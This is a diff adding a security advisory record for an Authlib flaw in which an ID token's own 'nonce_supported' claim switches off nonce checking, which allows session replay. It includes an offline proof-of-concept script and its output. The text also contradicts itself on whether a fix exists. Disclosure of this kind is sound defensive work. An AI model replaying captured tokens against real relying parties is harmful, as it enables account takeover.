@@ -1,0 +1,128 @@
+{
+  "id": "GHSA-c5mf-xmp2-59rc",
+  "modified": "2026-10-27T15:47:24.252855085Z",
+  "published": "2026-10-27T15:39:13Z",
+  "aliases": [
+    "CVE-2026-114617"
+  ],
+  "summary": "Authlib: ID token can disable its own nonce validation via the nonce_supported claim",
+  "details": "### Summary\n\n`OpenIDMixin.parse_id_token()` reads the `nonce_supported` claim from the ID token it is validating. When that claim is boolean `false`, the expected nonce is set to `None` and nonce validation is skipped for that token.\n\nAn ID token that carries this claim is therefore accepted in a session whose nonce does not match. A captured, validly signed ID token belonging to a victim can be replayed into an attacker-controlled session, authenticating the attacker as the victim at the relying party.\n\nThe code is identical in `authlib/integrations/base_client/sync_openid.py:82-83` and `authlib/integrations/base_client/async_openid.py:84-85`, so all framework integrations are affected. Fixed versions: none; reproduced on 1.8.0 (commit c529a61a).\n  \nPreconditions: the ID token must carry a valid signature and pass `iss` and `aud` validation, and the attacker must be able to supply it to `parse_id_token()`. Authorization code flow is not affected. Implicit and hybrid relying parties, and applications calling `parse_id_token()` directly, are affected.\n\n### Details\n\n## Affected code\n\n`authlib/integrations/base_client/sync_openid.py:80-85`, in `parse_id_token()`:\n\n```python\nclaims = claims_cls(token.claims, token.header, claims_options, claims_params)\n# https://github.com/authlib/authlib/issues/259\nif claims.get(\"nonce_supported\") is False:\n    claims.params[\"nonce\"] = None\n\nclaims.validate(leeway=leeway)\n```\n\n`authlib/integrations/base_client/async_openid.py:82-86` contains the same code.\n\n## Source of the claim\n\n`claims` is constructed from `token.claims`, which is the decoded payload of the ID token passed to `parse_id_token()`:\n\n```python\ntoken = jwt.decode(\n    token[\"id_token\"],\n    key=key_set,\n    registry=JWSRegistry(algorithms=alg_values, strict_check_header=False),\n)\n...\nclaims = claims_cls(token.claims, token.header, claims_options, claims_params)\n```\n\n`claims.get(\"nonce_supported\")` therefore resolves against the ID token payload. It is not read from `load_server_metadata()`, from client configuration, or from any other source under the relying party's control.\n\n## Effect on validation\n\n`IDToken.validate_nonce()` at `authlib/oidc/core/claims.py:69-83` performs the comparison only when the expected value is truthy:\n\n```python\nnonce_value = self.params.get(\"nonce\")\nif nonce_value:\n    if \"nonce\" not in self:\n        raise MissingClaimError(\"nonce\")\n    if nonce_value != self[\"nonce\"]:\n        raise InvalidClaimError(\"nonce\")\n```\n\nAssigning `claims.params[\"nonce\"] = None` makes `nonce_value` falsy, so both the presence check and the equality check are skipped. No error is raised and `claims.validate()` completes normally.\n\nThe docstring of that same method states the requirement:\n\n\u003e If present in the ID Token, Clients MUST verify that the nonce Claim Value is equal to the value of the nonce parameter sent in the Authentication Request.\n\n## Trigger condition\n\nThe comparison is `is False`, so only a JSON boolean `false` activates the branch. A string value `\"false\"` does not, and nonce validation proceeds normally in that case.\n\n## Origin\n\nThe branch was added in commit `3ca7333c` (\"Skip verifying nonce for Apple case\") to accommodate a provider that emits a `nonce_supported` claim, as referenced by the inline comment pointing to issue #259.\n\n## Remediation\n\nRead the flag from server metadata or client configuration rather than from the token:\n\n```python\nmetadata = self.load_server_metadata()\nif metadata.get(\"nonce_supported\") is False:\n    claims.params[\"nonce\"] = None\n```\n\nThis preserves the behavior for relying parties configured against a provider that does not support nonces, while preventing the token from determining whether it is subject to nonce validation.\n\n### Proof of concept\n\n## Environment\n\n- authlib 1.8.0, commit `c529a61a` (tag `v1.8.0`)\n- Python 3.14\n- joserfc 1.7.5\n- No network access required\n\n```\ngit clone https://github.com/authlib/authlib.git \u0026\u0026 cd authlib\ngit checkout c529a61a\npython3 -m venv .venv\n.venv/bin/pip install -e . joserfc==1.7.5\n.venv/bin/python poc.py\n```\n\n## Configuration\n\nThe relying party is a subclass of the shipped `OpenIDMixin` supplying only `client_id` and `load_server_metadata()`. `fetch_jwk_set()` returns `metadata[\"jwks\"]` directly when the key set is present in metadata, so no HTTP request is made and no part of the validation path is stubbed.\n\nThe signing key is a generated RSA key. All three tokens are signed with it, carry `iss` and `aud` matching the relying party configuration, and are within their validity window. The relying party's session nonce is `nonce-the-rp-actually-generated`; every token carries the different nonce `nonce-from-the-captured-token`.\n\n## poc.py\n\n```python\nfrom joserfc import jwt\nfrom joserfc.jwk import RSAKey\nfrom authlib.integrations.base_client.sync_openid import OpenIDMixin\n\nISSUER = \"https://as.example\"\nCLIENT_ID = \"rp-client\"\nKEY = RSAKey.generate_key(2048, parameters={\"kid\": \"k1\"})\nJWKS = {\"keys\": [KEY.as_dict(private=False)]}\n\n\nclass RP(OpenIDMixin):\n    client_id = CLIENT_ID\n\n    def load_server_metadata(self):\n        return {\"issuer\": ISSUER, \"jwks\": JWKS}\n\n\ndef id_token(nonce, sub=\"victim\", nonce_supported=None):\n    claims = {\"iss\": ISSUER, \"sub\": sub, \"aud\": CLIENT_ID,\n              \"iat\": 1000000000, \"exp\": 4000000000, \"auth_time\": 1000000000}\n    if nonce is not None:\n        claims[\"nonce\"] = nonce\n    if nonce_supported is not None:\n        claims[\"nonce_supported\"] = nonce_supported\n    return jwt.encode({\"alg\": \"RS256\", \"kid\": \"k1\"}, claims, KEY)\n\n\nrp = RP()\nSESSION_NONCE = \"nonce-the-rp-actually-generated\"\nCAPTURED_NONCE = \"nonce-from-the-captured-token\"\n\ncases = [\n    (\"[1] no nonce_supported claim\", None),\n    (\"[2] nonce_supported: false\", False),\n    (\"[3] nonce_supported: \\\"false\\\"\", \"false\"),\n]\n\nfor label, flag in cases:\n    tok = {\"access_token\": \"AT\",\n           \"id_token\": id_token(CAPTURED_NONCE, nonce_supported=flag)}\n    try:\n        user = rp.parse_id_token(tok, nonce=SESSION_NONCE)\n        print(f\"{label:34s} -\u003e ACCEPTED sub={user['sub']}\")\n    except Exception as e:\n        print(f\"{label:34s} -\u003e REJECTED {type(e).__name__}: {e}\")\n```\n\n## Expected result\n\nAll three cases carry a nonce that does not match the relying party's session nonce, so all three should be rejected.\n\n## Observed result\n\n```\n[1] no nonce_supported claim       -\u003e REJECTED InvalidClaimError: invalid_claim: Invalid claim: 'nonce'\n[2] nonce_supported: false         -\u003e ACCEPTED sub=victim\n[3] nonce_supported: \"false\"       -\u003e REJECTED InvalidClaimError: invalid_claim: Invalid claim: 'nonce'\n```\n\nCase [1] shows nonce validation rejecting a mismatched nonce under normal conditions. Case [2] differs from case [1] only by the addition of the `nonce_supported` claim and is accepted, returning the subject of the replayed token. Case [3] confirms the branch requires a JSON boolean.\n\nThe script exits 0 and produces identical output across three runs.\n\n### Impact\n\n## Type of vulnerability\n\nReliance on an untrusted input in a security decision (CWE-807), resulting in authentication bypass by capture-replay (CWE-294).\n\nThe nonce binds an ID token to the browser session that requested it and is the control that prevents a token issued for one session being presented in another. Because the flag that governs this check is read from the token itself, the check can be disabled by the data it is applied to.\n\n## Who is impacted\n\nOpenID Connect relying parties built on authlib's client integrations where an attacker can supply an ID token to `parse_id_token()`:\n\n- Implicit flow relying parties, where the ID token is returned in the URL fragment.\n- Hybrid flow relying parties, where the ID token is returned in the fragment or by form post.\n- Applications calling `parse_id_token()` directly on externally supplied input.\n\nBoth the synchronous and asynchronous integrations are affected, so Flask, Django and Starlette deployments are equally exposed.\n\nRelying parties using plain authorization code flow are not impacted, as the ID token is retrieved from the token endpoint over TLS following a `state` lookup and cannot be substituted by an attacker.\n\n## Consequence\n\nAn attacker in possession of a victim's ID token replays it into their own session. Nonce validation is skipped, `parse_id_token()` returns a `UserInfo` for the victim's subject, and the relying party establishes an authenticated session as the victim. This grants access to the victim's account at that relying party, including any data and actions available through it.\n\nThe token must carry a valid signature and pass `iss` and `aud` validation, so the vulnerability does not permit forging tokens or authenticating as an arbitrary subject. It removes the replay protection from a genuine token that has been captured, for example from browser history, a `Referer` header, proxy or server logs, or a shared device.\n\n## Mitigation available to integrators\n\nNone. The check is performed inside `parse_id_token()`, and no parameter or configuration option is exposed to disable the behaviour or to override the nonce handling.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "authlib",
+        "purl": "pkg:pypi/authlib"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.9.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.1",
+        "0.10",
+        "0.11",
+        "0.12",
+        "0.12.1",
+        "0.13",
+        "0.14",
+        "0.14.1",
+        "0.14.2",
+        "0.14.3",
+        "0.15",
+        "0.15.1",
+        "0.15.2",
+        "0.15.3",
+        "0.15.4",
+        "0.15.5",
+        "0.15.6",
+        "0.1rc0",
+        "0.2",
+        "0.2.1",
+        "0.3",
+        "0.4",
+        "0.4.1",
+        "0.5",
+        "0.5.1",
+        "0.6",
+        "0.7",
+        "0.8",
+        "0.9",
+        "1.0.0",
+        "1.0.0a1",
+        "1.0.0a2",
+        "1.0.0b1",
+        "1.0.0b2",
+        "1.0.0rc1",
+        "1.0.1",
+        "1.1.0",
+        "1.2.0",
+        "1.2.1",
+        "1.3.0",
+        "1.3.1",
+        "1.3.2",
+        "1.4.0",
+        "1.4.1",
+        "1.5.0",
+        "1.5.1",
+        "1.5.2",
+        "1.6.0",
+        "1.6.1",
+        "1.6.10",
+        "1.6.11",
+        "1.6.12",
+        "1.6.2",
+        "1.6.3",
+        "1.6.4",
+        "1.6.5",
+        "1.6.6",
+        "1.6.7",
+        "1.6.8",
+        "1.6.9",
+        "1.7.0",
+        "1.7.1",
+        "1.7.2",
+        "1.8.0"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 1.8.0",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/10/GHSA-c5mf-xmp2-59rc/GHSA-c5mf-xmp2-59rc.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/authlib/authlib/security/advisories/GHSA-c5mf-xmp2-59rc"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-114617"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/authlib/authlib/pull/949"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/authlib/authlib/commit/6563f6f7a8c2f71d2f85ee7511d72a4fbae3acc0"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/authlib/authlib"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/authlib/authlib/releases/tag/v1.9.0"
+    }
+  ]
+}
